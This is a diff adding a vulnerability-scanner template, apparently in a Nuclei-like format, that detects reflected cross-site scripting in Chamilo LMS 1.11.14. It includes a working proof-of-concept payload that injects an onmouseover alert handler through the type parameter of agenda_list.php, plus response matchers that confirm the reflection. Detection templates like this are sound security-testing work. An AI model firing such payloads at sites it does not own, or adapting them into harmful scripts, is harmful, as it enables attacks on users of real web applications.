@@ -1,0 +1,29 @@
+id: chamilo-lms-xss
+brief:
+    title: Chamilo LMS 1.11.14 Cross-Site Scripting
+    by: geeknik
+    level: high
+    about: Chamilo LMS 1.11.14 is vulnerable to cross-site scripting.
+    label:
+        - xss
+        - chamilo
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/main/calendar/agenda_list.php?type=xss"+onmouseover=alert(document.domain)+"'
+      signs:
+        - "on": word
+          has:
+            - agenda_js.php?type=xss" onmouseover=alert(document.domain)
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
